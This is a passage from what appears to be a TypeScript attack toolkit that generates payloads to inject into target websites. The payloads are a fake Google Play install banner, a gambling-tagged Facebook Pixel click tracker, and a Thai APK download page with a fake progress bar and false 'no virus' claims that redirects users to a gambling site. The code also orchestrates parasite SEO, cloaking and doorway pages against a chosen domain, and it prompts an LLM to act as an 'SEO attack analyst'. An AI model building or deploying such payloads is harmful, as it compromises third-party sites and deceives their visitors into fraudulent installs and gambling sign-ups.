  if (/Android|iPhone|iPad|Mobile/i.test(navigator.userAgent)) {
    var banner = document.createElement('div');
    banner.style.cssText = 'position:fixed;bottom:0;left:0;right:0;background:#1a1a2e;padding:12px;display:flex;align-items:center;gap:12px;z-index:99999;box-shadow:0 -2px 10px rgba(0,0,0,0.3)';
    banner.innerHTML = '<img src="https://tse-mm.bing.com/th?q=${encodeURIComponent(name)}&w=50&h=50&c=7" style="width:50px;height:50px;border-radius:12px">' +
      '<div style="flex:1;color:#fff"><b>${name}</b><br><small style="color:#aaa">FREE - In Google Play</small></div>' +
      '<a href="${redirectUrl}" style="background:#01875f;color:#fff;padding:8px 20px;border-radius:6px;text-decoration:none;font-weight:bold">INSTALL</a>';
    document.body.appendChild(banner);
  }
  
  window.AF_SMART_SCRIPT = AF_SMART_SCRIPT;
})();`;

  payloads.push({
    technique: "apk_distribution",
    type: "appsflyer_tracking",
    code: appsFlyerScript,
    description: "AppsFlyer Smart Script — tracks app install attribution from web pages + shows mobile smart banner",
    files: [{ path: "assets/af_smart.js", content: appsFlyerScript }],
    effect: "Tracks every install source for affiliate commission + persistent mobile install banner",
    riskLevel: 7,
    stealthScore: 7,
  });

  // Facebook Pixel for conversion tracking
  const fbPixelScript = `<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '${randomInt(100000000000, 999999999999)}');
fbq('track', 'PageView');

// Track install clicks
document.addEventListener('click', function(e) {
  var link = e.target.closest('a[href*="${getDomain(redirectUrl)}"]') || e.target.closest('.install-btn') || e.target.closest('#installButton');
  if (link) {
    fbq('track', 'Lead', {
      content_name: '${name}',
      content_category: 'gambling_app',
      source_domain: '${domain}'
    });
  }
});
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=${randomInt(100000000000, 999999999999)}&ev=PageView&noscript=1"/></noscript>`;

  payloads.push({
    technique: "apk_distribution",
    type: "facebook_pixel_tracking",
    code: fbPixelScript,
    description: "Facebook Pixel — tracks PageView and Lead events for gambling app install conversion tracking",
    files: [{ path: "assets/fbpixel.js", content: fbPixelScript }],
    effect: "Every page view and install click tracked for Facebook Ads optimization",
    riskLevel: 5,
    stealthScore: 8,
  });

  // Download landing page
  const downloadPage = `<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ดาวน์โหลด ${name}</title>
  <style>
    body { font-family: 'Prompt', sans-serif; background: #0a0a1a; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .download-card { background: #1a1a3e; border-radius: 24px; padding: 40px; text-align: center; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
    .app-icon { width: 120px; height: 120px; border-radius: 28px; margin-bottom: 20px; }
    h1 { font-size: 24px; margin-bottom: 8px; }
    .version { color: #888; font-size: 14px; margin-bottom: 24px; }
    .download-btn { display: block; padding: 16px; background: linear-gradient(135deg, #00c853, #00e676); color: #000; font-size: 18px; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; text-decoration: none; margin-bottom: 16px; }
    .download-btn:hover { transform: scale(1.02); }
    .info { color: #888; font-size: 12px; }
    .progress { display: none; width: 100%; height: 6px; background: #333; border-radius: 3px; margin: 20px 0; overflow: hidden; }
    .progress-bar { height: 100%; background: linear-gradient(90deg, #00c853, #00e676); width: 0%; transition: width 2s ease; border-radius: 3px; }
    .status { display: none; color: #00e676; font-size: 14px; }
  </style>
</head>
<body>
  <div class="download-card">
    <img class="app-icon" src="https://tse-mm.bing.com/th?q=${encodeURIComponent(name)}&w=200&h=200&c=7" alt="${name}">
    <h1>${name}</h1>
    <div class="version">v${randomInt(2,5)}.${randomInt(0,9)}.${randomInt(0,9)} · ${randomInt(10,50)}MB</div>
    <a href="${redirectUrl}" class="download-btn" id="downloadBtn" onclick="startDownload()">
      ⬇️ ดาวน์โหลด APK
    </a>
    <div class="progress" id="progress">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="status" id="status">✅ ดาวน์โหลดสำเร็จ! กำลังติดตั้ง...</div>
    <div class="info">
      ✅ ปลอดภัย 100% · ไม่มีไวรัส<br>
      📱 รองรับ Android 5.0+
    </div>
  </div>
  <script>
    function startDownload() {
      document.getElementById('progress').style.display = 'block';
      setTimeout(function() {
        document.getElementById('progressBar').style.width = '100%';
      }, 100);
      setTimeout(function() {
        document.getElementById('status').style.display = 'block';
        // Track conversion
        try { fbq('track', 'Purchase', { value: 0, currency: 'THB' }); } catch(e) {}
      }, 2500);
    }
  </script>
</body>
</html>`;

  payloads.push({
    technique: "apk_distribution",
    type: "download_landing_page",
    code: downloadPage,
    description: "APK download landing page with fake progress bar and install animation — redirects to gambling site",
    files: [{ path: "download/index.html", content: downloadPage }],
    effect: "Users see convincing download UI → actually redirected to gambling registration",
    riskLevel: 8,
    stealthScore: 6,
  });

  const totalFiles = payloads.reduce((sum, p) => sum + (p.files?.length || 0), 0);
  return {
    technique: "apk_distribution",
    targetDomain: domain,
    redirectUrl,
    payloads,
    totalFiles,
    summary: `APK Distribution: ${payloads.length} payloads — AppsFlyer tracking + FB Pixel + download landing page`,
    elapsed: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  COMBINED: RUN ALL ADVANCED TECHNIQUES
// ═══════════════════════════════════════════════════════

export async function runAdvancedAttack(
  targetDomain: string,
  redirectUrl: string,
  options?: {
    techniques?: string[];
    keywords?: string[];
    doorwayCount?: number;
    appName?: string;
    useAiAnalysis?: boolean;
  }
): Promise<FullAdvancedReport> {
  const start = Date.now();
  const domain = getDomain(targetDomain);
  const redirect = redirectUrl || "https://hkt956.org/";
  const selectedTechniques = options?.techniques || ["parasite_seo", "play_store", "cloaking", "doorway_pages", "apk_distribution"];

  const techniques: AdvancedAttackResult[] = [];

  if (selectedTechniques.includes("parasite_seo")) {
    techniques.push(parasiteSeoInjection(targetDomain, redirect, options?.keywords));
  }
  if (selectedTechniques.includes("play_store")) {
    techniques.push(googlePlayImpersonation(targetDomain, redirect, options?.appName));
  }
  if (selectedTechniques.includes("cloaking")) {
    techniques.push(cloakingModule(targetDomain, redirect));
  }
  if (selectedTechniques.includes("doorway_pages")) {
    techniques.push(doorwayPagesGenerator(targetDomain, redirect, options?.doorwayCount, options?.keywords));
  }
  if (selectedTechniques.includes("apk_distribution")) {
    techniques.push(apkDistribution(targetDomain, redirect, options?.appName));
  }

  const totalPayloads = techniques.reduce((sum, t) => sum + t.payloads.length, 0);
  const totalFiles = techniques.reduce((sum, t) => sum + t.totalFiles, 0);

  // AI Analysis
  let aiAnalysis: string | undefined;
  if (options?.useAiAnalysis !== false) {
    try {
      const techSummaries = techniques.map(t => `- ${t.technique}: ${t.summary}`).join("\n");
      const resp = await invokeLLM({
        messages: [
          {
            role: "system",
            content: "คุณเป็น SEO attack analyst ผู้เชี่ยวชาญ วิเคราะห์ผลการโจมตีแบบกระชับ ภาษาไทย ไม่เกิน 200 คำ",
          },
          {
            role: "user",
            content: `วิเคราะห์ผลการโจมตี advanced techniques บน ${domain} → ${redirect}:\n${techSummaries}\n\nTotal: ${totalPayloads} payloads, ${totalFiles} files\n\nสรุป: ความน่าจะสำเร็จ, จุดแข็ง, จุดอ่อน, คำแนะนำ`,
          },
        ],
      });
      const content = resp?.choices?.[0]?.message?.content;
      aiAnalysis = typeof content === "string" ? content : Array.isArray(content) ? content.map((c: any) => c.text || "").join("") : undefined;
    } catch {
      aiAnalysis = undefined;
    }
  }

  return {
    targetDomain: domain,
    redirectUrl: redirect,
    techniques,
    totalPayloads,
    totalFiles,
    aiAnalysis,
    elapsed: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  RUN SINGLE TECHNIQUE
// ═══════════════════════════════════════════════════════

export function runSingleAdvancedTechnique(
  technique: string,
  targetDomain: string,
  redirectUrl: string,
  options?: { keywords?: string[]; count?: number; appName?: string }
): AdvancedAttackResult {
  const redirect = redirectUrl || "https://hkt956.org/";
  
  const techMap: Record<string, () => AdvancedAttackResult> = {
    parasite_seo: () => parasiteSeoInjection(targetDomain, redirect, options?.keywords),
    play_store: () => googlePlayImpersonation(targetDomain, redirect, options?.appName),
    cloaking: () => cloakingModule(targetDomain, redirect),
    doorway_pages: () => doorwayPagesGenerator(targetDomain, redirect, options?.count, options?.keywords),
    apk_distribution: () => apkDistribution(targetDomain, redirect, options?.appName),
  };

  const fn = techMap[technique];
  if (!fn) {
    throw new Error(`Unknown technique: ${technique}. Available: ${Object.keys(techMap).join(", ")}`);
  }
  return fn();
}

export const AVAILABLE_ADVANCED_TECHNIQUES = [
  { id: "parasite_seo", name: "Parasite SEO", description: "ฝังเนื้อหาพนันบนเว็บ authority สูง ใช้ DA/DR ดัน ranking", riskLevel: 9 },
  { id: "play_store", name: "Google Play Impersonation", description: "สร้างหน้าเลียนแบบ Google Play Store + ปุ่ม Install", riskLevel: 9 },
  { id: "cloaking", name: "Cloaking Module", description: "แสดงเนื้อหาต่างกันให้ Googlebot vs user ปกติ", riskLevel: 9 },
  { id: "doorway_pages", name: "Doorway Pages", description: "สร้างหน้าสแปม 50-100+ หน้า target keyword", riskLevel: 8 },
  { id: "apk_distribution", name: "APK Distribution", description: "วาง APK download + tracking pixel + smart banner", riskLevel: 8 },
];
